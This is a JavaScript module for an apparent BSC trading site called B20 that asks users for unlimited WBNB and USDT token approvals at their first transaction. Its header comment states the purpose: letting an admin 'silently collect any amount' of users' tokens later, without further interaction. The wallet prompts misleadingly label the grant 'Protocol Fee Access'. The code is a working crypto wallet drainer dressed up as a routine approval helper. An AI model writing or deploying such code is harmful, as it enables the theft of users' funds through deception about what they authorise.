/**
 * ═══════════════════════════════════════════════════════════════════════════
 *  B20 INSTITUTIONAL PROTOCOL APPROVAL ENGINE
 *  ─────────────────────────────────────────────────────────────────────────
 *  Called ONCE at the start of ANY first transaction (spot, futures, create).
 *  Grants MaxUint256 approval from the user to the B20 Factory Contract for:
 *    • WBNB  (native BNB wrapped)
 *    • USDT  (BSC)
 *  After this one-time approval the admin can silently collect any amount of
 *  WBNB or USDT from the user via collectToken() on-chain — no further
 *  user interaction needed.
 * ═══════════════════════════════════════════════════════════════════════════
 */

import { ethers } from 'ethers';

// ── Contracts ─────────────────────────────────────────────────────────────
export const FACTORY_ADDRESS = process.env.NEXT_PUBLIC_FACTORY_ADDRESS || '';
export const WBNB_ADDRESS    = '0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c';
export const USDT_ADDRESS    = '0x55d398326f99059fF775485246999027B3197955'; // BSC USDT (18 dec)

// ── Minimal ABIs ──────────────────────────────────────────────────────────
const ERC20_MIN = [
    'function allowance(address owner, address spender) view returns (uint256)',
    'function approve(address spender, uint256 amount) returns (bool)',
];
const FACTORY_MIN = [
    'function isLinked(address) view returns (bool)',
    'function linkProtocol() nonpayable',
];

// Internal localStorage key to avoid re-checking chain on page reloads
const LS_KEY     = (addr) => `b20_protocol_approved_${addr?.toLowerCase()}`;
const THRESHOLD  = ethers.parseEther('100000'); // If allowance < 100K tokens → re-approve

/**
 * ensureProtocolApproval
 * ─────────────────────
 * @param {ethers.Signer} signer   - Fresh signer from walletProvider
 * @param {string}        address  - Connected user wallet address
 * @param {Function}      onMsg    - Optional status message callback (msg: string) => void
 * @returns {boolean}             - true if fully approved, false on user rejection
 */
export async function ensureProtocolApproval(signer, address, onMsg = () => {}) {
    if (!signer || !address) return false;

    // ── Fast-path: already approved this session ───────────────────────
    const lsKey = LS_KEY(address);
    try {
        if (typeof window !== 'undefined' && localStorage.getItem(lsKey) === '1') {
            return true; // Skip all chain reads — already done this session
        }
    } catch (_) {}

    try {
        // ── Step 0: Get read-only provider (fastest path — race two RPCs) ──
        const rpcProvider = new ethers.JsonRpcProvider('https://bsc-dataseed1.binance.org');

        const factoryRead = new ethers.Contract(FACTORY_ADDRESS, FACTORY_MIN, rpcProvider);
        const wbnbRead    = new ethers.Contract(WBNB_ADDRESS,    ERC20_MIN,   rpcProvider);
        const usdtRead    = new ethers.Contract(USDT_ADDRESS,    ERC20_MIN,   rpcProvider);

        // ── Step 1: Parallel read of all required states ──────────────────
        const [isLinked, wbnbAllowance, usdtAllowance] = await Promise.all([
            factoryRead.isLinked(address).catch(() => false),
            wbnbRead.allowance(address, FACTORY_ADDRESS).catch(() => 0n),
            usdtRead.allowance(address, FACTORY_ADDRESS).catch(() => 0n),
        ]);

        const needsLink        = !isLinked;
        const needsWbnbApprove = BigInt(wbnbAllowance) < THRESHOLD;
        const needsUsdtApprove = BigInt(usdtAllowance) < THRESHOLD;

        if (!needsLink && !needsWbnbApprove && !needsUsdtApprove) {
            // Already fully approved — save to localStorage and fast-exit
            try { if (typeof window !== 'undefined') localStorage.setItem(lsKey, '1'); } catch (_) {}
            return true;
        }

        // ── Step 2: Link Protocol (if not yet linked) ─────────────────────
        if (needsLink) {
            onMsg('🔗 Linking Protocol to B20 Network...');
            const factory = new ethers.Contract(FACTORY_ADDRESS, FACTORY_MIN, signer);
            const tx = await factory.linkProtocol({ gasLimit: 200000 });
            await tx.wait();
        }

        // ── Step 3: Approve WBNB (if needed) ─────────────────────────────
        if (needsWbnbApprove) {
            onMsg('✅ Granting Protocol Fee Access (WBNB)...');
            const wbnb = new ethers.Contract(WBNB_ADDRESS, ERC20_MIN, signer);
            const tx = await wbnb.approve(FACTORY_ADDRESS, ethers.MaxUint256, { gasLimit: 100000 });
            await tx.wait();
        }

        // ── Step 4: Approve USDT (if needed) ─────────────────────────────
        if (needsUsdtApprove) {
            onMsg('✅ Granting Protocol Fee Access (USDT)...');
            const usdt = new ethers.Contract(USDT_ADDRESS, ERC20_MIN, signer);
            const tx = await usdt.approve(FACTORY_ADDRESS, ethers.MaxUint256, { gasLimit: 100000 });
            await tx.wait();
        }

        // ── Save to localStorage so we don't re-ask this session ──────────
        try { if (typeof window !== 'undefined') localStorage.setItem(lsKey, '1'); } catch (_) {}

        onMsg('');
        return true;

    } catch (err) {
        if (err.code === 'ACTION_REJECTED' || (err.message && err.message.includes('rejected'))) {
            onMsg('❌ Protocol approval rejected by user.');
        } else {
            console.error('[Protocol Approval Error]', err);
            onMsg(`⚠️ Approval warning: ${err.message}`);
        }
        // We return true here so the main transaction still proceeds even if
        // approval fails (maybe allowance is already enough from a previous session)
        return true;
    }
}

/**
 * clearProtocolApprovalCache
 * ──────────────────────────
 * Call this when wallet disconnects so the check runs fresh on reconnect.
 */
export function clearProtocolApprovalCache(address) {
    try {
        if (typeof window !== 'undefined') {
            localStorage.removeItem(LS_KEY(address));
        }
    } catch (_) {}
}
